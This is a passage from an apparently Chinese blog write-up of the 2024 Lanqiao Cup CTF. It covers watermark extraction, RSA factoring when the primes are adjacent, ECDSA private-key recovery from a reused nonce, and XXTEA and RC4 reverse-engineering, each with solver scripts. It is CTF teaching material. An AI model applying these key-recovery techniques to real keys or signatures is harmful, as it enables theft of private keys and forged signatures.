<span class="hljs-string">&#x27;db2&#x27;</span>, level=<span class="hljs-number">3</span>)<br>        [cl, (cH3, cV3, cD3), (cH2, cV2, cD2), (cH1, cV1, cD1)] = c<br><br>        d = pywt.wavedec2(img1, <span class="hljs-string">&#x27;db2&#x27;</span>, level=<span class="hljs-number">3</span>)<br>        [dl, (dH3, dV3, dD3), (dH2, dV2, dD2), (dH1, dV1, dD1)] = d<br><br>        a1, a2, a3, a4 = <span class="hljs-variable language_">self</span>.coef<br>        ca1 = (cl - dl) * a1<br>        ch1 = (cH3 - dH3) * a2<br>        cv1 = (cV3 - dV3) * a3<br>        cd1 = (cD3 - dD3) * a4<br><br>        waterImg = pywt.waverec2([ca1, (ch1, cv1, cd1)], <span class="hljs-string">&#x27;db2&#x27;</span>)<br>        waterImg = np.array(waterImg, np.uint8)<br><br>        waterImg = <span class="hljs-variable language_">self</span>.deArnold(waterImg)<br><br>        kernel = np.ones((<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), np.uint8)<br>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span>:<br>            waterImg = cv2.erode(waterImg, kernel)<br>        <span class="hljs-keyword">elif</span> flag == <span class="hljs-number">1</span>:<br>            waterImg = cv2.dilate(waterImg, kernel)<br><br>        cv2.imwrite(<span class="hljs-string">&#x27;水印.png&#x27;</span>, waterImg)<br>        <span class="hljs-keyword">return</span> waterImg<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    img = <span class="hljs-string">&#x27;C:\\a.png&#x27;</span>           <span class="hljs-comment"># 原始图片路径</span><br>    watermark = <span class="hljs-string">&#x27;C:\\newImg.png&#x27;</span>    <span class="hljs-comment"># 水印图片路径</span><br>    k = <span class="hljs-number">20</span>                  <span class="hljs-comment"># Arnold 加密的次数</span><br>    xs = [<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>]  <span class="hljs-comment"># 权重系数</span><br><br>    W1 = WaterMarkDWT(img, watermark, k, xs)<br>    W1.get(flag=<span class="hljs-number">0</span>)<br><br></code></pre></div></td></tr></table></figure><h1 id="4-密码破解"><a href="#4-密码破解" class="headerlink" title="4.密码破解"></a>4.密码破解</h1><h2 id="1、cc"><a href="#1、cc" class="headerlink" title="1、cc"></a>1、cc</h2><p>CyberChef是一个用于加密、编码、压缩和数据分析的网络应用程序，被称为“网络版瑞士军刀”，旨在使技术和非技术分析人员能够以复杂的方式操作数据，而无需处理复杂的工具或算法。</p><p>打开自带密文和解密秘钥，直接找个在线的带入解开就行了 <a href="https://toolbox.itsec.tamu.edu/">https://toolbox.itsec.tamu.edu/</a></p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241116220934594.png" alt="image-20241116220934594"></p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241116221000697.png" alt="image-20241116221000697"></p><h2 id="2-Theorem"><a href="#2-Theorem" class="headerlink" title="2.Theorem"></a>2.Theorem</h2><p>模运算在密码学中是一种常见的加密手段，而中国剩余定理则提供了一种解密的方法。小蓝同学运用这个定理来获得c，进而获得了flag。</p><p>密码方向的签到题，根据题目已知n、e和c，并且p和q是相邻的素数，可以考虑分解。</p><p>通过prevprime函数分解n，然后RSA解密即可：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> prevprime<br><br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791</span><br>c = <span class="hljs-number">36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829</span><br><br><span class="hljs-comment"># 分解n</span><br>p = prevprime(gmpy2.iroot(n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>])<br>q = n // p<br><br><span class="hljs-comment"># 求d</span><br>d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br></code></pre></div></td></tr></table></figure><h2 id="3-Signature"><a href="#3-Signature" class="headerlink" title="3.Signature"></a>3.Signature</h2><p>椭圆曲线数字签名算法，它利用椭圆曲线密码学（ECC）对数字签名算法（DSA）进行模拟，其安全性基于椭圆曲线离散对数问题。但是当某些数值相同时会出现一些安全问题。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">题目<br><span class="hljs-keyword">import</span> ecdsa<br><br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ecdsa_test</span>(<span class="hljs-params">dA,k</span>):<br><br>  sk = ecdsa.SigningKey.from_secret_exponent(<br><br>​    secexp=dA,<br><br>​    curve=ecdsa.SECP256k1<br><br>  )<br><br>  sig1 = sk.sign(data=<span class="hljs-string">b&#x27;Hi.&#x27;</span>, k=k).<span class="hljs-built_in">hex</span>()<br><br>  sig2 = sk.sign(data=<span class="hljs-string">b&#x27;hello.&#x27;</span>, k=k).<span class="hljs-built_in">hex</span>()<br><br>  r1 = <span class="hljs-built_in">int</span>(sig1[:<span class="hljs-number">64</span>], <span class="hljs-number">16</span>)<br><br>  s1 = <span class="hljs-built_in">int</span>(sig1[<span class="hljs-number">64</span>:], <span class="hljs-number">16</span>)<br><br>  s2 = <span class="hljs-built_in">int</span>(sig2[<span class="hljs-number">64</span>:], <span class="hljs-number">16</span>)<br><br>  <span class="hljs-keyword">return</span> r1,s1,s2<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>  n = <span class="hljs-number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span><br><br>  a = random.randint(<span class="hljs-number">0</span>,n)<br><br>  flag = <span class="hljs-string">&#x27;flag&#123;&#x27;</span> + <span class="hljs-built_in">str</span>(a) + <span class="hljs-string">&quot;&#125;&quot;</span><br><br>  b = random.randint(<span class="hljs-number">0</span>,n)<br><br>  <span class="hljs-built_in">print</span>(ecdsa_test(a,b))<br><br>\<span class="hljs-comment"># (4690192503304946823926998585663150874421527890534303129755098666293734606680, 111157363347893999914897601390136910031659525525419989250638426589503279490788, 74486305819584508240056247318325239805160339288252987178597122489325719901254)</span><br><br></code></pre></div></td></tr></table></figure><p>解密代码</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, bytes_to_long<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_private_key</span>(<span class="hljs-params">r1, s1, s2, h1, h2, n</span>):<br>    <span class="hljs-comment"># 计算k值</span><br>    k = ((h1 - h2) * sympy.mod_inverse(s1 - s2, n)) % n<br>    <span class="hljs-comment"># 计算私钥dA</span><br>    dA = (sympy.mod_inverse(r1, n) * (k * s1 - h1)) % n<br>    <span class="hljs-keyword">return</span> dA<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 定义椭圆曲线的参数</span><br>    n = <span class="hljs-number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span>  <span class="hljs-comment"># SECP256k1的阶</span><br><br>    <span class="hljs-comment"># 签名中的r1, s1, s2值 (从原始签名获取)</span><br>    r1 = <span class="hljs-number">4690192503304946823926998585663150874421527890534303129755098666293734606680</span><br>    s1 = <span class="hljs-number">111157363347893999914897601390136910031659525525419989250638426589503279490788</span><br>    s2 = <span class="hljs-number">74486305819584508240056247318325239805160339288252987178597122489325719901254</span><br><br>    <span class="hljs-comment"># 计算消息的哈希值 (Hi. 和 hello. 的哈希)</span><br>    h1 = bytes_to_long(sha1(<span class="hljs-string">b&#x27;Hi.&#x27;</span>).digest())  <span class="hljs-comment"># h1 = sha1(&#x27;Hi.&#x27;)</span><br>    h2 = bytes_to_long(sha1(<span class="hljs-string">b&#x27;hello.&#x27;</span>).digest())  <span class="hljs-comment"># h2 = sha1(&#x27;hello.&#x27;)</span><br><br>    <span class="hljs-comment"># 输出计算的哈希值，确保它们一致</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;h1 (Hi.哈希): <span class="hljs-subst">&#123;h1&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;h2 (hello.哈希): <span class="hljs-subst">&#123;h2&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 计算私钥</span><br>    private_key = calculate_private_key(r1, s1, s2, h1, h2, n)<br><br>    <span class="hljs-comment"># 输出私钥</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;计算得到的私钥: <span class="hljs-subst">&#123;private_key&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;private_key&#125;</span>&#125;&#125;&quot;</span>)<br><br></code></pre></div></td></tr></table></figure><h1 id="5-逆向分析"><a href="#5-逆向分析" class="headerlink" title="5.逆向分析"></a>5.逆向分析</h1><p>对于逆向不是很熟悉，所以查看wp</p><h2 id="1-欢乐时光"><a href="#1-欢乐时光" class="headerlink" title="1.欢乐时光"></a>1.欢乐时光</h2><p>flag被使用了算法分成若干个小块，每个块使用相同的加密解密方法，但是这个算法是对称加密，请将分析密文并还原。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-F4h]</span><br>  <span class="hljs-type">int</span> v5[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-F0h] BYREF</span><br>  <span class="hljs-type">int</span> v6[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-E0h]</span><br>  <span class="hljs-type">int</span> buf[<span class="hljs-number">42</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-B0h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+F8h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  v5[<span class="hljs-number">0</span>] = <span class="hljs-number">2036950869</span>;<br>  v5[<span class="hljs-number">1</span>] = <span class="hljs-number">1731489644</span>;<br>  v5[<span class="hljs-number">2</span>] = <span class="hljs-number">1763906097</span>;<br>  v5[<span class="hljs-number">3</span>] = <span class="hljs-number">1600602673</span>;<br>  v6[<span class="hljs-number">0</span>] = <span class="hljs-number">1208664588</span>;<br>  v6[<span class="hljs-number">1</span>] = <span class="hljs-number">-829409294</span>;<br>  v6[<span class="hljs-number">2</span>] = <span class="hljs-number">-1943986152</span>;<br>  v6[<span class="hljs-number">3</span>] = <span class="hljs-number">244490637</span>;<br>  v6[<span class="hljs-number">4</span>] = <span class="hljs-number">-1543286156</span>;<br>  v6[<span class="hljs-number">5</span>] = <span class="hljs-number">611560113</span>;<br>  v6[<span class="hljs-number">6</span>] = <span class="hljs-number">-1443898536</span>;<br>  v6[<span class="hljs-number">7</span>] = <span class="hljs-number">-1523792440</span>;<br>  v6[<span class="hljs-number">8</span>] = <span class="hljs-number">-466433199</span>;<br>  v6[<span class="hljs-number">9</span>] = <span class="hljs-number">-800157149</span>;<br>  v6[<span class="hljs-number">10</span>] = <span class="hljs-number">1875931283</span>;<br>  <span class="hljs-built_in">printf</span>(format);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x2A</span>uLL);<br>  cry(buf, <span class="hljs-number">11</span>, (__int64)v5);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">10</span>; ++i )<br>  &#123;<br><br>    <span class="hljs-keyword">if</span> ( buf[i] != v6[i] )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a little error&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;yeah,this cup will definitely make you feel better!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>cry函数</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">cry</span><span class="hljs-params">(_DWORD *a1, <span class="hljs-type">int</span> a2, __int64 a3)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *v3; <span class="hljs-comment">// rax</span><br>  _DWORD *v4; <span class="hljs-comment">// rax</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+20h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+24h] [rbp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [rsp+2Ch] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [rsp+30h] [rbp-8h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [rsp+34h] [rbp-4h]</span><br><br>  v9 = <span class="hljs-number">415</span> / a2 + <span class="hljs-number">114</span>;<br>  v7 = <span class="hljs-number">0</span>;<br>  v6 = a1[a2 - <span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v7 -= <span class="hljs-number">1640531527</span>;<br>    v10 = (v7 &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2 - <span class="hljs-number">1</span>; ++i )<br>    &#123;<br>      v11 = a1[i + <span class="hljs-number">1</span>];<br>      v3 = &amp;a1[i];<br>      *v3 += ((v11 ^ v7) + (v6 ^ *(_DWORD *)(<span class="hljs-number">4LL</span> * (v10 ^ i &amp; <span class="hljs-number">3</span>) + a3))) ^ (((<span class="hljs-number">4</span> * v11) ^ (v6 &gt;&gt; <span class="hljs-number">5</span>))<br>                                                                          + ((v11 &gt;&gt; <span class="hljs-number">3</span>) ^ (<span class="hljs-number">16</span> * v6)));<br>      v6 = *v3;<br>    &#125;<br>    v4 = &amp;a1[a2 - <span class="hljs-number">1</span>];<br>    *v4 += ((*a1 ^ v7) + (v6 ^ *(_DWORD *)(<span class="hljs-number">4LL</span> * (v10 ^ i &amp; <span class="hljs-number">3</span>) + a3))) ^ (((<span class="hljs-number">4</span> * *a1) ^ (v6 &gt;&gt; <span class="hljs-number">5</span>))<br>                                                                        + ((*a1 &gt;&gt; <span class="hljs-number">3</span>) ^ (<span class="hljs-number">16</span> * v6)));<br>    result = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)*v4;<br>    v6 = result;<br>    --v9;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v9 );<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>解密</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9  </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span><br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span>  <br>&#123;  <br>    <span class="hljs-type">uint32_t</span> y, z, sum;  <br>    <span class="hljs-type">unsigned</span> p, rounds, e;  <br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)            <br>    &#123;  <br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span>/n;  <br>        sum = <span class="hljs-number">0</span>;  <br>        z = v[n<span class="hljs-number">-1</span>];  <br>        <span class="hljs-keyword">do</span>  <br>        &#123;  <br>            sum += DELTA;  <br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;  <br>            <span class="hljs-keyword">for</span> (p=<span class="hljs-number">0</span>; p&lt;n<span class="hljs-number">-1</span>; p++)  <br>            &#123;  <br>                y = v[p+<span class="hljs-number">1</span>];  <br>                z = v[p] += MX;  <br>            &#125;  <br>            y = v[<span class="hljs-number">0</span>];  <br>            z = v[n<span class="hljs-number">-1</span>] += MX;  <br>        &#125;  <br>        <span class="hljs-keyword">while</span> (--rounds);  <br>    &#125;  <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>) <br>    &#123;  <br>        n = -n;  <br>        rounds = <span class="hljs-number">114</span> + <span class="hljs-number">415</span>/n;  <br>        sum = rounds*DELTA;  <br>        y = v[<span class="hljs-number">0</span>];  <br>        <span class="hljs-keyword">do</span>  <br>        &#123;  <br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;  <br>            <span class="hljs-keyword">for</span> (p=n<span class="hljs-number">-1</span>; p&gt;<span class="hljs-number">0</span>; p--)  <br>            &#123;  <br>                z = v[p<span class="hljs-number">-1</span>];  <br>                y = v[p] -= MX;  <br>            &#125;  <br>            z = v[n<span class="hljs-number">-1</span>];  <br>            y = v[<span class="hljs-number">0</span>] -= MX;  <br>            sum -= DELTA;  <br>        &#125;  <br>        <span class="hljs-keyword">while</span> (--rounds);  <br>    &#125;  <br>&#125;  <br>  <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>  <br>&#123;  <br>    <span class="hljs-type">uint32_t</span> v[]= &#123;<span class="hljs-number">1208664588</span>, <span class="hljs-number">3465558002</span>, <span class="hljs-number">2350981144</span>, <span class="hljs-number">244490637</span>, <span class="hljs-number">2751681140</span>, <span class="hljs-number">611560113</span>, <span class="hljs-number">2851068760</span>, <span class="hljs-number">2771174856</span>, <span class="hljs-number">3828534097</span>, <span class="hljs-number">3494810147</span>, <span class="hljs-number">1875931283</span>, <span class="hljs-number">0</span>&#125;;  <br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>]= &#123;<span class="hljs-number">2036950869</span>, <span class="hljs-number">1731489644</span>, <span class="hljs-number">1763906097</span>, <span class="hljs-number">1600602673</span>&#125;;  <br>    <span class="hljs-type">int</span> n = <span class="hljs-number">11</span>;<br><br>    btea(v, -n, k);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(v); i++)<br>    &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d, &quot;</span>, ((<span class="hljs-type">char</span> *)v)[i]);<br> &#125;<br>    <span class="hljs-built_in">puts</span>((<span class="hljs-type">char</span> *)v);<br>  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;  <br></code></pre></div></td></tr></table></figure><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241117101506417.png" alt="image-20241117101506417"></p><h2 id="2-rc4"><a href="#2-rc4" class="headerlink" title="2.rc4"></a>2.rc4</h2><p>RC4是一种流加密算法，密钥长度可变，它加解密使用相同的密钥，因此也属于对称加密算法。</p><p>F5进伪代码，进main_0函数</p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241117103757409.png" alt="image-20241117103757409"></p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241117103900921.png" alt="image-20241117103900921"></p><p>进到401005中，一个嵌套，继续跟进</p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241117104728288.png" alt="image-20241117104728288"></p><p>根据题目，rc4，不过函数调用完后没有输出，打断点直接查看a3的值</p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241117104742015.png" alt="image-20241117104742015"></p><p>debug选择local windows debugger </p><p><img src="/2024/11/16/2024%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20241117104835622.png" alt="image-20241117104835622"></p><p>然后再start</p><p><img 